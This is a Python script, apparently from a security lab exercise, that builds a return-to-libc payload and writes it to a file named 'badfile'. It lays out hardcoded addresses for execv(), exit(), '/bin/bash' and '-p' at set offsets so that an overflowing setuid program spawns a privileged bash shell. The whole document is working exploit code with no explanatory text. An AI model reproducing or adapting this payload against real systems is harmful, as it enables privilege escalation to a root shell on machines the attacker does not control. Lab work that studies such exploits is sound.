#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

base = 52
sh_addr       = 0xffffd698          # The address of "/bin/bash"
optionp_addr  = 0xffffd6e1         # The address of "-p"
execv_addr    = 0xf7e93410          # The address of execv()
exit_addr     = 0xf7dfeec0          # The address of exit()
argv_addr     = 0xffffd080 + base   # The address of argv (input at main function)


# Construct the argv[]
content[base:base+4] = (sh_addr).to_bytes(4,byteorder='little')

content[base+4:base+8] = (optionp_addr).to_bytes(4,byteorder='little')
content[base+8:base+12] = 0x00000000.to_bytes(4,byteorder='little')

X = 36
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

Y = 28
content[Y:Y+4] = (execv_addr).to_bytes(4,byteorder='little')

Z = 32
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

F = 40
content[F:F+4] = (argv_addr).to_bytes(4, byteorder='little')

# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
